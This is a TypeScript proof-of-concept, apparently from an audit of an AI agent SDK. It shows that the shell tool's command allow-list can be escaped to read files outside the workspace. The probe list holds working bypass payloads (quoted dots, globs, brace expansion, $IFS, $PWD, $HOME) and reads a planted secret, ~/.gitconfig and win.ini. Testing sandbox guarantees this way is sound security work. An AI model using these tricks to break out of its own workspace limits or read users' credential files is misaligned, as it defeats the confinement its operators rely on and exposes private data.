/* TOOLS: createShellTool string allow-list "no path outside the workspace" guarantee
   is bypassable with plain shell syntax. Real execution through NodeWorkspace (Git sh.exe
   for POSIX, cmd.exe for Windows) against a secret file one level above the workspace root.
   Run: npx tsx eve/tools/shell-allowlist-escape.ts   (from E:\agent-sdk\audit) */
import { mkdtempSync, mkdirSync, writeFileSync } from 'node:fs';
import { tmpdir, homedir } from 'node:os';
import { join } from 'node:path';
import { createShellTool, NodeWorkspace } from '@lousho/build-ai-agent';

const base = mkdtempSync(join(tmpdir(), 'eve-shell-'));
const root = join(base, 'ws');
mkdirSync(root);
writeFileSync(join(base, 'secret.txt'), 'TOP-SECRET-OUTSIDE-WORKSPACE');

async function probe(label: string, shellPath: string | undefined, allow: string[], cmds: string[]) {
  const ws = new NodeWorkspace({ root, ...(shellPath ? { shell: shellPath } : {}) });
  const tool: any = createShellTool(ws, { allow, needsApproval: false });
  console.log(`--- ${label} (shell=${ws.shell}) allow=${JSON.stringify(allow)}`);
  for (const command of cmds) {
    try {
      const r = await tool.execute({ command }, {});
      const leaked = /TOP-SECRET|PRIVATE KEY|root:|\[user\]|\[core\]|\[credential\]|\[fonts\]|16-bit/.test(r.stdout);
      console.log(`${leaked ? 'ESCAPED ' : 'ran     '} ${JSON.stringify(command)} -> exit ${r.exitCode} ${JSON.stringify(r.stdout.slice(0, 14))}`);
    } catch (e) {
      console.log(`refused  ${JSON.stringify(command)} -> ${String((e as Error).message).slice(0, 70)}`);
    }
  }
}

await probe('POSIX sh', 'C:/Program Files/Git/bin/sh.exe', ['cat'], [
  'cat ../secret.txt',            // control: must be refused
  'cat "../secret.txt"',          // quoted ..
  "cat '..'/secret.txt",          // quote only the dots
  'cat .?/secret.txt',            // glob: .? matches ..
  'cat {..,x}/secret.txt',        // brace expansion
  'cat ${IFS}../secret.txt',      // $IFS separator
  'cat $PWD/../secret.txt',       // variable expands to absolute path
  'cat $HOME/.gitconfig',         // $HOME = ~
  'cat "$HOME"/.gitconfig',
]);

await probe('cmd.exe', undefined, ['type'], [
  'type ..\\secret.txt',          // control
  'type "..\\secret.txt"',        // quoted ..
  'type "c:\\windows\\win.ini"',  // quoted absolute path
]);
console.log('home exists for $HOME probe:', Boolean(homedir()));
